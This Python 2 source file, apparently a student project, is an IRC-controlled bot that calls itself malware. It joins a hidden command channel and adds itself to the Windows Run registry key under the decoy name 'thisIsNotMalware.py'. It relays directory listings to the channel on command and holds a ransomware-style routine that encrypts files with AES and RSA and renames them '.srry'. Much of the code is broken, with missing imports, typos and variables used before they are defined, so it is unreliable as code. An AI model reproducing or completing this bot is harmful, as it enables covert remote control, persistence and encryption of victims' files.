# -*- coding: utf-8 -*-

# from _winreg import *
from shutil import copy
from Crypto import Random
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA
from Crypto.Cipher import PKCS1_v1_5
import subprocess as sb
import os
import platform
import random
import socket
import sys
import string as st

CHANNEL = "#FerruscaHernandez"
# SERVER = "192.168.1.30"
# SERVER = "10.4.21.58"
SERVER = "172.16.150.128"
IRC_PORT = 6667
HOMEPATH = 'HOMEPATH' if platform.system() == 'Windows' else 'HOME'
DEFAULT_LOCATION = "C:\\users\\" + os.getenv(HOMEPATH) + "\\appdata\\roaming\\"

auth = False

IRC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def persistence():
    # copy file itself to another location
    shutil.copy(__file__, DEFAULT_LOCATION + "thisIsNotMalware.py")
    # Writing in Windows Registry
    keyVal = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER, keyVal)
    # SetValueEx(key, "JLF", 0, REG_SZ, "C:\\users\\malware\\appdata\\roaming\\thisIsNotMalware.py")
    SetValueEx(key, "JLF", 0, REG_EXPAND_SZ, DEFAULT_LOCATION + "thisIsNotMalware.py")
    # SetValueEx(key, "JLF", 0, REG_EXPAND_SZ, "C:\\users\\%HOMEPATH%\\appdata\\roaming\\thisIsNotMalware.py")
    CloseKey(key)

def gen_nickname():
    lenNick = random.randint(5,8) 
    listChoice = list(st.ascii_lowercase+st.digits)
    nick=""
    for x in range(lenNick):
        nick += random.choice(listChoice)
    return nick

def send(chan, msg):
    IRC.send("PRIVMSG " + chan + " :" + msg + "\n")

def connect(server, channel, botnick, port):
    print "connecting to:"+server
    IRC.connect((server, port))                                                         
    IRC.send("USER " + botnick + " " + botnick +" " + botnick + " :This is a fun bot!\n")
    IRC.send("NICK " + botnick + "\n")               
    IRC.send("JOIN " + channel + "\n")        #join the chat
    IRC.send("MODE " + channel + " +k hola123"+ "\n")       # contraseña del canal 
    IRC.send("MODE " + channel + " +s"+ "\n")       # canal en modo silencioso

def get_text():
    text=IRC.recv(2040)  #receive the text

    if text.find('PING') != -1:                      
        IRC.send('PONG ' + text.split() [1] + '\r\n') 
    return text

def sayMyName(channel):
    send(channel, "Me llamo malware :o")

def command_ls(path='.'):
    stdout, stderr = sb.Popen(['ls', path], stdout = sb.PIPE).communicate()
    # Para Linux
    mandar = ", ".join(stdout.split('\n'))
    # Para Windows
    mandar = ", ".join(stdout.split('\r\n'))
    send(CHANNEL, mandar)
    print "Se envió ls"

def command_pwd():
    stdout, stderr = sb.Popen(['pwd'], stdout = sb.PIPE).communicate()
    send(CHANNEL, stdout)
    print "Se envió pwd"

def check_auth(msg):
    '''
        Función para checar si tiene permisos para ejecutar comandos
    '''
    print msg.split()
    return False

def create_store_rsa():
    try:
        f = open(DEFAULT_LOCATION + "lallave.pub")
        f.close()
    except IOError:
        # If public key does not exists, then create it
        with open(DEFAULT_LOCATION + 'laLlave.pem', 'w') as priv_key:
            with open(DEFAULT_LOCATION + 'laLlave.pub', 'w') as pub_key:
                keys = RSA.generate(4096)
                priv_key.write(keys.exportKey())
                pub_key.write(keys.publickey().exportKey())

def rsa_cipher(key, text):
    try:
        h = SHA.new(text)
        cipher = PKCS1_v1_5.new(key)
        return cipher.encrypt(text+h.digest())
    except:
        return None

def import_rsa(location):
    try: 
        key_text = open(location).read()
        key = RSA.importKey(key_text)
        return key
    except:
        return None

#                                       ,,_
# Función creada por Jorge Ferrusca    o"  )~
#                                       ''''
def cifraArchivo(filename, aes_key):
    '''
        @param {string} filename    Nombre del archivo a cifrar
        @param {string} aes_key     Llave AES con la que se cifrará el archivo
    '''
    ciphered_filename = finename + '.srry'
    file_size = os.path.getsize(filename)
    # generating AES key
    aes = AES.new(key, AES.MODE_CBC, iv)
    iv = Random.new().read(AES.block_size)
    # importing RSA public key
    pub_rsa_key = import_rsa(DEFAULT_LOCATION + 'laLlave.pub')
    if not pub_rsa_key:
        print "No se pudo importar la llave pública"
        return False 
    # ciphering AES key with RSA key
    ciphered_key = rsa_ipher(pub_rsa_key, aes_key)
    if not ciphered_key:
        print "Error al cifrar AES, verifique la(s) llave(s)"
        return False 
    # read block must be multiple of 16
    bytes_read = 2048
    with open(filename, 'rb') as input_file:
        with open(ciphered_filename, 'wb') as output_file:
            # removing any padding to the data while encrypting
            output_file.write(struct.pack('<Q', file_size))
            output_file.write(iv)
            output_file.write(ciphered_key)
            while True:
                raw_data = input_file.read(bytes_read)
                data_len = len(raw_data)
                if data_len == 0:
                    break
                elif data_len % 16 != 0:
                    # data padded with some spaces
                    raw_data += ' ' * (16 - data_len % 16) 
                output_file.write(aes.encrypt(raw_data))

# Generamos aleatoriamente nickName para la victima
NICKNAME =  gen_nickname()
try:
    connect(SERVER, CHANNEL, NICKNAME, IRC_PORT)
except:
    print "\nError: la red es inalcanzable"
    sys.exit()

while 1:
    text = get_text()
    print text

    if "PRIVMSG" in text and CHANNEL in text:
        if auth:
            print "estoy entrando a la parte autenticada"
            if "!@cifraArchivo" in text:
                # format: foo.txt AES.key
                cifraArchivo(text.split(" ")[0], text.split(" ")[1])
            elif "!@ls" in text:
                command = text.split(" ")[-1]
                print "command: ", command
                path = command.replace('\r\n', '')
                if path != ':!@ls':
                    command_ls(path)
                else:
                    command_ls()
            elif "!@pwd" in text:
                command_pwd()
            elif "como te llamas ?" in text:
                sayMyName(CHANNEL)
            elif "hello" in text:
                send(CHANNEL, "Hello!")
        else:
            if "!@auth" in text:
                auth = check_auth(text)